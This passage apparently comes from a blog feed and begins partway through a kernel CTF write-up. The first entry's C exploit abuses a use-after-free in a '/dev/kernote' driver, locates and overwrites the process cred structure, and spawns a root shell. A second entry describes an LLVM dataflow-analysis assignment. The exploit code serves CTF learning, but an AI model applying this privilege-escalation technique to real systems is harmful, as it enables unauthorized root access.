class="type">size_t</span>*)memmem(buffer,sc-&gt;bufferSize,sc-&gt;searchString,sc-&gt;searchStringsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(sc-&gt;debug)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(result_addr)</span><br><span class="line">            HEX(result_addr);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(sc-&gt;constraint(result_addr))</span><br><span class="line">    {</span><br><span class="line">        LOG(<span class="string">"Found Target membytes"</span>);</span><br><span class="line">        sc-&gt;Addtional = result_addr[<span class="number">-2</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">char</span>*)result_addr-buffer;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> cred_addr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ttyfd = open(<span class="string">"/dev/ptmx"</span>,O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((dev_fd = open(<span class="string">"/dev/kernote"</span>,O_RDWR))&lt;<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        err_exit(<span class="string">"open device"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"Starting brute dma base"</span>);</span><br><span class="line">    page_offset_base = ldt_guessing_direct_mapping_area(create_uaf,<span class="number">0</span>,editNote,<span class="number">0</span>,<span class="number">0x4000000</span>);</span><br><span class="line">    HEX(page_offset_base);</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"Starting to Search struct cred1"</span>);</span><br><span class="line">    pthread_setname_np(pthread_self(),<span class="string">"HanQi.."</span>);</span><br><span class="line">    serach_config sc = {.bufferSize=<span class="number">0x8000</span>,.searchString=<span class="string">"HanQi.."</span>,.searchStringsize=<span class="number">8</span>,.debug=<span class="number">0</span>,.constraint=is_cred_comm};</span><br><span class="line">    ldt_seeking_memory(editNote,<span class="number">0</span>,page_offset_base,memsearch,&amp;sc);</span><br><span class="line">    cred_addr = sc.Addtional;</span><br><span class="line">    HEX(cred_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    desc.base_addr = <span class="number">0</span>;</span><br><span class="line">    desc.entry_number = <span class="number">2</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    LOG(<span class="string">"Try to modify cred"</span>);</span><br><span class="line">    <span class="type">pthread_t</span> modify_thr;</span><br><span class="line"></span><br><span class="line">    editNote(<span class="number">0</span>,cred_addr+<span class="number">4</span>);</span><br><span class="line">    <span class="type">int</span> retval=fork();</span><br><span class="line">    <span class="keyword">if</span>(!retval)</span><br><span class="line">    {</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span>(!retval)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//child child</span></span><br><span class="line">            bind_core(<span class="number">0</span>);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">15</span>;++i)</span><br><span class="line">                addNote(i);</span><br><span class="line">            chooseNote(<span class="number">11</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">15</span>;++i)</span><br><span class="line">                delNote(i);</span><br><span class="line">            bind_core(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">                editNote(<span class="number">0</span>,cred_addr+<span class="number">4</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//child</span></span><br><span class="line">            bind_core(<span class="number">0</span>);</span><br><span class="line">            sleep(<span class="number">3</span>);</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">            sleep(<span class="number">200</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,geteuid());</span><br><span class="line">        setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        get_root_shell();</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312281602695.png"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSCD70 Assignment2 DataFlow</title>
      <link href="/2023/CSCD70-Assignment2/"/>
      <url>/2023/CSCD70-Assignment2/</url>
      
        <content type="html"><![CDATA[<p>理论部分学习: <a href="https://hanqi-blogs.cn/2023/DataFlow-Analysis">数据流分析笔记</a><br>只展示部分代码,完整代码见github.</p><span id="more"></span><h2 id="数据流分析框架"><a href="#数据流分析框架" class="headerlink" title="数据流分析框架"></a>数据流分析框架</h2><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>设计一个数据流分析框架,需要先清楚数据流分析有哪些部分.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312171514663.png"><br>再细分一下就是:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312171512849.png"></p><h4 id="Domain"><a href="#Domain" class="headerlink" title="Domain"></a>Domain</h4><p>Domain是数据流分析所关心的对象,比如到达定值的对象是定值,活跃变量的对象是变量……</p><p>写好一些常用的分析对象,表达式和变量.<br>一个分析对象应该提供从IR指令中创建的方法和比较相等的方法.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Expression</span> <span class="keyword">final</span> : DomainBase&lt;Expression&gt; {</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> Opcode;</span><br><span class="line">  <span class="type">const</span> llvm::Value *<span class="type">const</span> LHS = <span class="literal">nullptr</span>, *<span class="type">const</span> RHS = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="built_in">Expression</span>(<span class="type">const</span> llvm::BinaryOperator &amp;BinaryOp)</span><br><span class="line">      : <span class="built_in">Opcode</span>(BinaryOp.<span class="built_in">getOpcode</span>()), <span class="built_in">LHS</span>(BinaryOp.<span class="built_in">getOperand</span>(<span class="number">0</span>)),</span><br><span class="line">        <span class="built_in">RHS</span>(BinaryOp.<span class="built_in">getOperand</span>(<span class="number">1</span>)) {}</span><br><span class="line">  <span class="built_in">Expression</span>(<span class="type">const</span> <span class="type">unsigned</span> Opcode, <span class="type">const</span> llvm::Value *<span class="type">const</span> LHS,</span><br><span class="line">             <span class="type">const</span> llvm::Value *<span class="type">const</span> RHS)</span><br><span class="line">      : <span class="built_in">Opcode</span>(Opcode), <span class="built_in">LHS</span>(LHS), <span class="built_in">RHS</span>(RHS) {}</span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Expression &amp;Other) <span class="type">const</span> <span class="keyword">final</span> {</span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    <span class="keyword">if</span>(llvm::Instruction::<span class="built_in">isCommutative</span>(Opcode))</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">return</span> </span><br><span class="line">      ((Opcode == Other.Opcode) &amp;&amp; (LHS == Other.LHS) &amp;&amp; (RHS == Other.RHS)) ||</span><br><span class="line">      ((Opcode == Other.Opcode) &amp;&amp; (LHS == Other.RHS) &amp;&amp; (RHS == Other.LHS));</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">return</span> ((Opcode == Other.Opcode) &amp;&amp; (LHS == Other.LHS) &amp;&amp; (RHS == Other.RHS));</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> Expression <span class="title">ExpressionFromIn</span><span class="params">(<span class="type">const</span> llvm::Instruction&amp; In)</span></span></span><br><span class="line"><span class="function">  </span>{</span><br><span class="line">    <span class="keyword">if</span>(llvm::<span class="built_in">isa</span>&lt;llvm::BinaryOperator&gt;(In))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Expression</span>(In.<span class="built_in">getOpcode</span>(),In.<span class="built_in">getOperand</span>(<span class="number">0</span>),In.<span class="built_in">getOperand</span>(<span class="number">1</span>));</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Variable</span> <span class="keyword">final</span> : DomainBase&lt;Variable&gt; {</span><br><span class="line">  <span class="type">const</span> llvm::Value *<span class="type">const</span> Var;</span><br><span class="line">  <span class="built_in">Variable</span>(<span class="type">const</span> llvm::Value *<span class="type">const</span> Var) : <span class="built_in">Var</span>(Var) {}</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Variable &amp;Other) <span class="type">const</span> { <span class="keyword">return</span> Var == Other.Var; }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> Variable <span class="title">VariableFromIn</span><span class="params">(<span class="type">const</span> llvm::Instruction&amp; In)</span></span></span><br><span class="line"><span class="function">  </span>{</span><br><span class="line">    <span class="keyword">if</span>(llvm::<span class="built_in">isa</span>&lt;llvm::Value&gt;(In))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Variable</span>(&amp;In);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在框架中用DomainVector存储分析的Domain,DomainIdMap用来做从对象到索引的转换.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> DomainIdMap_t = std::unordered_map&lt;TDerivedDomainElem, <span class="type">size_t</span>&gt;;</span><br><span class="line"><span class="keyword">using</span> DomainVector_t = std::vector&lt;TDerivedDomainElem&gt;;</span><br><span class="line"></span><br><span class="line">DomainIdMap_t DomainIdMap;</span><br><span class="line">DomainVector_t DomainVector;</span><br></pre></td></tr></tbody></table></figure><p>光存储分析对象没用,还需要存储每条指令对于每个对象的分析结果,BVs是基本块的INPUT(注意是INPUT不是IN,随分析方向不同而含义不同),InstDomainValMap是一条指令的OUTPUT(同上).<br>两者合起来就有了对每条指令完整的IN,OUT(基本块的INPUT同时也是基本块第一条指令的INPUT).</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::unordered_map&lt;<span class="type">const</span> llvm::BasicBlock *, DomainVal_t&gt; BVs;</span><br><span class="line">std::unordered_map&lt;<span class="type">const</span> llvm::Instruction *, DomainVal_t&gt; InstDomainValMap;</span><br></pre></td></tr></tbody></table></figure><p>以及对单个分析对象的分析结果表示</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// @brief For each domain element type, we have to define:</span></span><br><span class="line"><span class="comment">///        - The default constructor</span></span><br><span class="line"><span class="comment">///        - The meet operators (for intersect/union)</span></span><br><span class="line"><span class="comment">///        - The top element</span></span><br><span class="line"><span class="comment">///        - Conversion to bool (for logging)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Bool</span> {</span><br><span class="line">  <span class="type">bool</span> Value = <span class="literal">false</span>;</span><br><span class="line">  Bool <span class="keyword">operator</span>&amp;(<span class="type">const</span> Bool &amp;Other) <span class="type">const</span> {</span><br><span class="line">    <span class="keyword">return</span> {.Value = Value &amp;&amp; Other.Value};</span><br><span class="line">  }</span><br><span class="line">  Bool <span class="keyword">operator</span>|(<span class="type">const</span> Bool &amp;Other) <span class="type">const</span> {</span><br><span class="line">    <span class="keyword">return</span> {.Value = Value || Other.Value};</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> Bool <span class="title">top</span><span class="params">()</span> </span>{ <span class="keyword">return</span> {.Value = <span class="literal">true</span>}; }</span><br><span class="line">  <span class="function"><span class="keyword">operator</span> <span class="title">bool</span><span class="params">()</span> <span class="type">const</span> </span>{ <span class="keyword">return</span> Value; }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="Direction"><a href="#Direction" class="headerlink" title="Direction"></a>Direction</h4><p>分析方向体现在遍历指令的顺序和获取MeetOperands的操作上.<br>Forward:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">virtual</span> MeetOperands_t <span class="title">getMeetOperands</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> </span>{</span><br><span class="line">    MeetOperands_t Operands;</span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">const</span> llvm::BasicBlock* preBB : <span class="built_in">getMeetBBConstRange</span>(BB))</span><br><span class="line">    {</span><br><span class="line">      DomainVal_t domain = InstDomainValMap.<span class="built_in">at</span>(&amp;(preBB-&gt;<span class="built_in">back</span>()));</span><br><span class="line">      Operands.<span class="built_in">push_back</span>(domain);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> Operands;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function">MeetBBConstRange_t</span></span><br><span class="line"><span class="function">  <span class="title">getMeetBBConstRange</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> llvm::<span class="built_in">predecessors</span>(&amp;BB);</span><br><span class="line">  }</span><br><span class="line">  <span class="function">InstConstRange_t <span class="title">getInstConstRange</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">make_range</span>(BB.<span class="built_in">begin</span>(), BB.<span class="built_in">end</span>());</span><br><span class="line">  }</span><br><span class="line">  <span class="function">BBConstRange_t <span class="title">getBBConstRange</span><span class="params">(<span class="type">const</span> llvm::Function &amp;F)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">make_range</span>(F.<span class="built_in">begin</span>(), F.<span class="built_in">end</span>());</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>Backward:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">virtual</span> MeetOperands_t <span class="title">getMeetOperands</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> </span>{</span><br><span class="line">    MeetOperands_t Operands;</span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">const</span> llvm::BasicBlock* preBB : <span class="built_in">getMeetBBConstRange</span>(BB))</span><br><span class="line">    {</span><br><span class="line">      DomainVal_t domain = InstDomainValMap.<span class="built_in">at</span>(&amp;(preBB-&gt;<span class="built_in">front</span>()));</span><br><span class="line">      Operands.<span class="built_in">push_back</span>(domain);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> Operands;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function">MeetBBConstRange_t</span></span><br><span class="line"><span class="function">  <span class="title">getMeetBBConstRange</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> llvm::<span class="built_in">successors</span>(&amp;BB);</span><br><span class="line">  }</span><br><span class="line">  <span class="function">InstConstRange_t <span class="title">getInstConstRange</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">make_range</span>(BB.<span class="built_in">rbegin</span>(), BB.<span class="built_in">rend</span>());</span><br><span class="line">  }</span><br><span class="line">  <span class="function">BBConstRange_t <span class="title">getBBConstRange</span><span class="params">(<span class="type">const</span> llvm::Function &amp;F)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">make_range</span>(F.<span class="built_in">rbegin</span>(), F.<span class="built_in">rend</span>());</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>对于Backward的分析,<br>llvm-16没有提供逆序遍历Function中Basic Block的接口,我给它加上了,感觉没什么理由不加这个接口.<br>其实之前版本(比如llvm-14)中也没有在Function类中提供这个接口,不过其的getBasicBlockList是public的,用户以F.getBasicBlockList().rbegin()的形式来实现backward的迭代.感觉像是改了访问属性但忘了加另外的接口.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//===--------------------------------------------------------------------===//</span></span><br><span class="line"><span class="comment">// BasicBlock iterator forwarding functions</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">iterator                <span class="title">begin</span><span class="params">()</span>       </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">begin</span>(); }</span><br><span class="line"><span class="function">const_iterator          <span class="title">begin</span><span class="params">()</span> <span class="type">const</span> </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">begin</span>(); }</span><br><span class="line"><span class="function">iterator                <span class="title">end</span>  <span class="params">()</span>       </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">end</span>();   }</span><br><span class="line"><span class="function">const_iterator          <span class="title">end</span>  <span class="params">()</span> <span class="type">const</span> </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">end</span>();   }</span><br><span class="line"></span><br><span class="line"><span class="comment">//===--------------------------------------------------------------------===//</span></span><br><span class="line"><span class="comment">// BasicBlock iterator backwarding functions</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">reverse_iterator        <span class="title">rbegin</span><span class="params">()</span>       </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">rbegin</span>(); }</span><br><span class="line"><span class="function">const_reverse_iterator  <span class="title">rbegin</span><span class="params">()</span> <span class="type">const</span> </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">rbegin</span>(); }</span><br><span class="line"><span class="function">reverse_iterator        <span class="title">rend</span>  <span class="params">()</span>       </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">rend</span>();   }</span><br><span class="line"><span class="function">const_reverse_iterator  <span class="title">rend</span>  <span class="params">()</span> <span class="type">const</span> </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">rend</span>();   }</span><br></pre></td></tr></tbody></table></figure><p>这是llvm对修改访问属性原因的描述:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/// This is deliberately private because we have implemented an adequate set</span><br><span class="line">/// of functions to modify the list, including Function::splice(),</span><br><span class="line">/// Function::erase(), Function::insert() etc.</span><br></pre></td></tr></tbody></table></figure><h4 id="Meet-Operator-Initial-Condition"><a href="#Meet-Operator-Initial-Condition" class="headerlink" title="Meet Operator , Initial Condition"></a>Meet Operator , Initial Condition</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> TValue&gt; <span class="keyword">struct</span> <span class="title class_">Intersect</span> <span class="keyword">final</span> : MeetOpBase&lt;TValue&gt; {</span><br><span class="line">  <span class="keyword">using</span> DomainVal_t = <span class="keyword">typename</span> MeetOpBase&lt;TValue&gt;::DomainVal_t;</span><br><span class="line"></span><br><span class="line">  <span class="function">DomainVal_t <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> DomainVal_t &amp;LHS,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="type">const</span> DomainVal_t &amp;RHS)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    DomainVal_t result = (*<span class="keyword">this</span>).<span class="built_in">top</span>(LHS.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; LHS.<span class="built_in">size</span>();++i)</span><br><span class="line">    {</span><br><span class="line">      result[i] = LHS[i] &amp; RHS[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line">  <span class="function">DomainVal_t <span class="title">top</span><span class="params">(<span class="type">const</span> std::<span class="type">size_t</span> DomainSize)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">DomainVal_t</span>(DomainSize,TValue::<span class="built_in">top</span>());</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// @todo(CSCD70) Please add another subclass for the Union meet operator.</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> TValue&gt; <span class="keyword">struct</span> <span class="title class_">Unite</span> <span class="keyword">final</span> : MeetOpBase&lt;TValue&gt; {</span><br><span class="line">  <span class="keyword">using</span> DomainVal_t = <span class="keyword">typename</span> MeetOpBase&lt;TValue&gt;::DomainVal_t;</span><br><span class="line"></span><br><span class="line">  <span class="function">DomainVal_t <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> DomainVal_t &amp;LHS,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="type">const</span> DomainVal_t &amp;RHS)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    DomainVal_t result = (*<span class="keyword">this</span>).<span class="built_in">top</span>(LHS.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; LHS.<span class="built_in">size</span>();++i)</span><br><span class="line">    {</span><br><span class="line">      result[i] = LHS[i] | RHS[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line">  <span class="function">DomainVal_t <span class="title">top</span><span class="params">(<span class="type">const</span> std::<span class="type">size_t</span> DomainSize)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">DomainVal_t</span>(DomainSize,<span class="built_in">TValue</span>());</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>从注释来看top是用来初始化,那么就应该是DomainVal_t的初始值,且该函数要求派生类重载,意味着这一”top”的概念在交集和并集中不同,应该就是代表数据流分析的Initial condition.这一点与南京大学的软件分析课程有点冲突.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/// @brief Return a domain value that represents the top element, used when</span></span><br><span class="line">  <span class="comment">///        doing the initialization.</span></span><br><span class="line">  <span class="comment">/// @param DomainSize</span></span><br><span class="line">  <span class="comment">/// @return</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> DomainVal_t <span class="title">top</span><span class="params">(<span class="type">const</span> std::<span class="type">size_t</span> DomainSize)</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="流程"><a href="#流程" class="headerlink" 